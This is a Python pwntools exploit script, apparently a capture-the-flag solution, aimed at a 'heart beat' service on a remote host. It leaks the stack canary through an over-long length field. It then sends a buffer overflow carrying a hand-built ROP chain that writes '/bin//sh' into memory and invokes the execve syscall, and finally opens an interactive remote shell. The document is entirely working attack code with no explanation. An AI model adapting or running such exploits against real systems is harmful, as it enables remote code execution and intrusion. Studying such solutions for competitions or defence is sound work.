from struct import pack as spack
from pwn import *

r = remote('34.123.210.162', 20233)
context(arch='amd64', os='linux', log_level='debug')
r.recvuntil(b'Waiting for heart beat request...\n')
p = b' 1100:'+b'a'*1032
r.sendline(p)
r.recvline()
canary = r.recvline()[1032:1040]
r.recvuntil(b'Waiting for heart beat request...\n')

p = b' 1:'+b'a'*1032+canary+b'a'*8
p += spack('<Q', 0x000000000040f30e)  # pop rsi ; ret
p += spack('<Q', 0x00000000004df0e0)  # @ .data
p += spack('<Q', 0x0000000000451fd7)  # pop rax ; ret
p += b'/bin//sh'
p += spack('<Q', 0x0000000000499b65)  # mov qword ptr [rsi], rax ; ret
p += spack('<Q', 0x000000000040f30e)  # pop rsi ; ret
p += spack('<Q', 0x00000000004df0e8)  # @ .data + 8
p += spack('<Q', 0x000000000044c190)  # xor rax, rax ; ret
p += spack('<Q', 0x0000000000499b65)  # mov qword ptr [rsi], rax ; ret
p += spack('<Q', 0x00000000004018e2)  # pop rdi ; ret
p += spack('<Q', 0x00000000004df0e0)  # @ .data
p += spack('<Q', 0x000000000040f30e)  # pop rsi ; ret
p += spack('<Q', 0x00000000004df0e8)  # @ .data + 8
p += spack('<Q', 0x00000000004017ef)  # pop rdx ; ret
p += spack('<Q', 0x00000000004df0e8)  # @ .data + 8
p += spack('<Q', 0x000000000044c190)  # xor rax, rax ; ret
p += spack('<Q', 0x000000000048ec70)*59  # add rax, 1 ; ret
p += spack('<Q', 0x00000000004012e3)  # syscall

r.sendline(p)
r.recvuntil(b'Waiting for heart beat request...\n')
r.sendline(b' 0:!')
r.interactive()
